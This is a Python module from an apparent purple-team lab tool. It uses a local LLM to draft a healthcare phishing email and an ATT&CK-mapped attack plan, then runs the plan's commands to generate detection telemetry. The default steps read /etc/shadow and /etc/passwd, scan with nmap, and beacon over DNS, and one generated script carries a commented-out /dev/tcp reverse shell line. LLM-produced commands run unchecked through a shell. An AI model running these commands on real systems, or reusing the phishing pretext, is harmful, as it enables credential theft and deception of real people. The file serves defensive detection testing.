"""Emulation Module (PurpleLab)

Purpose
- Generates a safe phishing scenario + ATT&CK-mapped attack plan using Ollama.
- Executes a *non-destructive* adversary emulation locally to generate realistic telemetry.

Safety / Guardrails
- No exploitation, malware, or persistence is performed.
- Commands are standard userland utilities intended to produce detection signals
  (e.g., HTTP requests, discovery commands, attempted /etc/shadow read).
- Designed to run in an isolated lab environment only.
"""

from __future__ import annotations

import json
import os
import re
import subprocess
import time
from collections import defaultdict
from datetime import datetime
from typing import Any, Dict, List, Mapping, Optional

from . import ai_analyzer

PAYLOAD_SIM_PATH = "/tmp/purplelab_payload_sim.sh"
REVSHELL_SIM_PATH = "/tmp/purplelab_revshell_sim.sh"

# Default ATT&CK-mapped steps used if AI scenario generation fails.
# Each step is intentionally non-destructive and designed to generate telemetry.
DEFAULT_STEPS: List[Dict[str, str]] = [
    {
        "name": "Phishing Link Click",
        "technique": "T1566.001",
        "command": "curl -s http://{target}/phish.html || wget -q -O /dev/null http://{target}/phish.html",
        "description": "Simulate user clicking a malicious link in phishing email.",
    },
    {
        "name": "DNS Beacon Simulation (Deterministic Rule Trigger)",
        "technique": "T1071.004",
        "command": "nslookup malicious.example.com || true; dig malicious.example.com +short || true",
        "description": "Generate deterministic DNS telemetry that matches PurpleLab Suricata rule.",
    },
    {
        "name": "System Discovery",
        "technique": "T1082",
        "command": "uname -a; whoami; ip a; hostname",
        "description": "Gather system information.",
    },
    {
        "name": "User Discovery",
        "technique": "T1033",
        "command": "cat /etc/passwd; id; lastlog",
        "description": "Enumerate users.",
    },
    {
        "name": "Credential Access - /etc/shadow Attempt",
        "technique": "T1003.008",
        "command": "cat /etc/shadow",
        "description": "Attempt to read password hashes.",
    },
    {
        "name": "Network Scanning",
        "technique": "T1046",
        "command": "nmap -sT -p 22,80,443 {target} --open",
        "description": "Scan for open ports.",
    },
    {
        "name": "Payload Staging Simulation (Benign)",
        "technique": "T1105",
        "command": "printf '#!/usr/bin/env bash\necho purplelab benign payload simulation\n' > " + PAYLOAD_SIM_PATH + " && chmod +x " + PAYLOAD_SIM_PATH + " && " + PAYLOAD_SIM_PATH + "",
        "description": "Create and execute a harmless local script to simulate payload staging.",
    },
    {
        "name": "Reverse Shell Attempt Simulation (Benign)",
        "technique": "T1059.004",
        "command": "printf '#!/usr/bin/env bash\necho purplelab reverse-shell simulation (no network action)\n# bash -i >& /dev/tcp/127.0.0.1/4444 0>&1\n' > " + REVSHELL_SIM_PATH + " && chmod +x " + REVSHELL_SIM_PATH + " && " + REVSHELL_SIM_PATH + "",
        "description": "Simulate reverse-shell execution patterns safely without opening outbound shell connectivity.",
    },
]

# Demo mode should be deterministic and tuned for likely detection signal generation.
DEMO_STEPS: List[Dict[str, str]] = [
    DEFAULT_STEPS[0],  # T1566.001 phishing-like web request
    DEFAULT_STEPS[1],  # T1071.004 deterministic DNS beacon
    {
        "name": "Payload Staging Simulation (Benign)",
        "technique": "T1105",
        "command": f"printf '#!/usr/bin/env bash\necho purplelab benign payload simulation\n' > {PAYLOAD_SIM_PATH} && chmod +x {PAYLOAD_SIM_PATH} && {PAYLOAD_SIM_PATH}",
        "description": "Create and execute a harmless local script to simulate payload staging.",
    },
    {
        "name": "Reverse Shell Attempt Simulation (Benign)",
        "technique": "T1059.004",
        "command": f"printf '#!/usr/bin/env bash\necho purplelab reverse-shell simulation (no network action)\n# bash -i >& /dev/tcp/127.0.0.1/4444 0>&1\n' > {REVSHELL_SIM_PATH} && chmod +x {REVSHELL_SIM_PATH} && {REVSHELL_SIM_PATH}",
        "description": "Simulate reverse-shell execution patterns safely without opening outbound shell connectivity.",
    },
    {
        "name": "Credential Access - /etc/shadow Attempt",
        "technique": "T1003.008",
        "command": "cat /etc/shadow",
        "description": "Attempt to read password hashes for auditd telemetry.",
    },
]


def _normalize_technique(raw: Any) -> str:
    if not raw:
        return ""
    text = str(raw).upper()
    m = re.search(r"T\d{4}(?:\.\d{3})?", text)
    return m.group(0) if m else ""


def ping_target(ip: str, verbose: bool = False) -> bool:
    """Ping the target IP once to check reachability (best-effort)."""
    if verbose:
        print(f"[VERBOSE] Pinging {ip}...")
    try:
        result = subprocess.run(["ping", "-c", "1", "-W", "1", ip], capture_output=True, timeout=5)
        return result.returncode == 0
    except subprocess.TimeoutExpired:
        return False
    except Exception:
        return False


def _build_format_map(config: Dict[str, Any], target: str) -> Mapping[str, str]:
    """
    Build a tolerant format mapping for AI-generated command templates.

    Why:
    - LLMs sometimes invent placeholders like {malicious_server}, {c2}, etc.
    - Python's str.format raises KeyError on unknown placeholders, aborting the run.

    Behavior:
    - Known keys are explicitly set.
    - Unknown keys default to the target IP/host to avoid crashing.
    """
    lab_cfg = config.get("lab", {}) if isinstance(config, dict) else {}
    malicious_server = lab_cfg.get("malicious_server", target)

    fmt = defaultdict(lambda: target)
    fmt["target"] = target
    # Common LLM-invented aliases we want to safely support:
    fmt["malicious_server"] = malicious_server
    fmt["c2"] = malicious_server
    fmt["c2_server"] = malicious_server
    fmt["payload_host"] = malicious_server
    return fmt


def generate_scenario(config: Dict[str, Any], verbose: bool = False, demo_mode: bool = False) -> str:
    if verbose:
        print("[VERBOSE] Generating AI scenario (phishing email + attack plan) via Ollama...")

    run_id = datetime.now().strftime("%Y%m%d_%H%M%S")
    run_dir = f"{config['paths']['runs_base']}/{run_id}"
    os.makedirs(f"{run_dir}/scenario", exist_ok=True)

    prompt = (
        "Generate a realistic phishing email targeting healthcare employees. "
        "Pretext: urgent patient record update. "
        "Also create a SAFE, lab-only post-click attack plan mapped to MITRE ATT&CK. "
        "Include these techniques somewhere in the plan: T1566.001, T1082, T1003.008, T1071.004.\n\n"
        "Return JSON with keys: email_subject, email_body, attack_steps. "
        f"attack_steps must be a list of {3 if demo_mode else 5} objects with: name, technique, description, command. "
        "Commands must be non-destructive and use standard Linux utilities only "
        "(curl/wget, uname/id/ip, cat, ls, nslookup/dig, nmap). "
        "Do NOT include reverse shells, persistence, or malware. "
        "IMPORTANT: Use ONLY {target} as the placeholder in commands. Do not invent other placeholders."
    )

    try:
        scenario = ai_analyzer.call_llm(config, prompt, json_mode=True)
        if not isinstance(scenario, dict) or "email_subject" not in scenario:
            raise ValueError("Unexpected scenario shape")

        normalized_steps: List[Dict[str, str]] = []
        for step in (scenario.get("attack_steps") or []):
            if not isinstance(step, dict):
                continue
            tech = _normalize_technique(step.get("technique"))
            cmd = (step.get("command") or "").strip()
            if not tech or not cmd:
                continue
            normalized_steps.append(
                {
                    "name": (step.get("name") or "Step").strip(),
                    "technique": tech,
                    "description": (step.get("description") or step.get("name") or "").strip(),
                    "command": cmd,
                }
            )

        if demo_mode:
            scenario["attack_steps"] = DEMO_STEPS
        elif len(normalized_steps) >= 3:
            scenario["attack_steps"] = normalized_steps
        else:
            scenario["attack_steps"] = DEFAULT_STEPS

        if verbose:
            print("[VERBOSE] AI scenario generated successfully.")
    except Exception as e:
        print(f"[!] AI generation failed: {e}. Using default scenario.")
        scenario = {
            "email_subject": "URGENT: Patient Record Update Required",
            "email_body": (
                "Dear employee,\n\n"
                "We detected an issue with your patient records. Please verify your information immediately.\n\n"
                "[Link]\n\n"
                "IT Department"
            ),
            "attack_steps": DEMO_STEPS if demo_mode else DEFAULT_STEPS,
        }

    with open(f"{run_dir}/scenario/email_template.txt", "w", encoding="utf-8") as f:
        f.write(f"Subject: {scenario['email_subject']}\n\n{scenario['email_body']}")

    with open(f"{run_dir}/scenario/attack_plan.json", "w", encoding="utf-8") as f:
        json.dump(scenario.get("attack_steps", DEFAULT_STEPS), f, indent=2)

    if verbose:
        print(f"[VERBOSE] Scenario saved to {run_dir}/scenario/")
    return run_id


def run_local(config: Dict[str, Any], run_id: str, verbose: bool = False, max_steps: Optional[int] = None) -> None:
    if not run_id:
        print("[!] No run_id provided. Generate a scenario first.")
        return

    if verbose:
        print("[VERBOSE] Starting local emulation...")

    run_dir = f"{config['paths']['runs_base']}/{run_id}"
    steps_file = f"{run_dir}/scenario/attack_plan.json"

    if not os.path.exists(steps_file):
        print("[!] Attack plan not found. Using default steps.")
        steps = DEFAULT_STEPS
    else:
        with open(steps_file, "r", encoding="utf-8") as f:
            steps = json.load(f)

    if isinstance(max_steps, int) and max_steps > 0:
        steps = (steps or [])[:max_steps]

    target = config.get("lab", {}).get("target_ip", "127.0.0.1")
    print(f"[*] Target configured as: {target}")

    # ICMP might be blocked; warn but continue.
    if not ping_target(target, verbose=verbose):
        print(f"[!] Ping to {target} failed (ICMP may be blocked). Continuing anyway...")

    fmt_map = _build_format_map(config, target)

    os.makedirs(f"{run_dir}/emulation", exist_ok=True)
    log_file = f"{run_dir}/red_runlog.jsonl"
    text_log = f"{run_dir}/emulation/emulation.log"

    with open(log_file, "w", encoding="utf-8") as log, open(text_log, "w", encoding="utf-8") as tlog:
        for step in steps:
            cmd_template = (step.get("command") or "").strip()
            name = step.get("name", "Step")
            tech = step.get("technique", "")

            # Tolerant formatting: unknown placeholders become target (prevents KeyError).
            try:
                cmd = cmd_template.format_map(fmt_map)
            except Exception:
                # As a last resort, run the raw template without formatting rather than crashing.
                cmd = cmd_template

            if verbose:
                print(f"[VERBOSE] Executing: {cmd}")
            print(f"[*] Executing: {name} ({tech})")
            tlog.write(f"[*] {name} ({tech})\n")

            start = datetime.utcnow().isoformat()
            try:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
                output = (result.stdout or "") + (result.stderr or "")
                exit_code = result.returncode
            except subprocess.TimeoutExpired as e:
                output = str(e)
                exit_code = -1
            except Exception as e:
                output = str(e)
                exit_code = -2
            end = datetime.utcnow().isoformat()

            # write a small excerpt to the text log for report readability
            excerpt_lines = (output or "").strip().splitlines()
            excerpt = "\n".join(excerpt_lines[:25])
            if excerpt:
                tlog.write(excerpt + "\n")
            tlog.write("\n")

            record = {
                "timestamp": start,
                "end_time": end,
                "name": name,
                "technique": tech,
                "command": cmd,
                "exit_code": exit_code,
                "output": (output or "")[:800],
            }
            log.write(json.dumps(record) + "\n")
            log.flush()
            time.sleep(1)

    if verbose:
        print(f"[VERBOSE] Emulation log saved to {log_file}")
    print(f"[+] Emulation complete. Log saved to {log_file}")


def get_last_run_id(config: Dict[str, Any]) -> Optional[str]:
    runs_base = config["paths"]["runs_base"]
    if not os.path.exists(runs_base):
        return None
    runs = [d for d in os.listdir(runs_base) if os.path.isdir(os.path.join(runs_base, d))]
    if not runs:
        return None
    runs.sort(reverse=True)
    return runs[0]
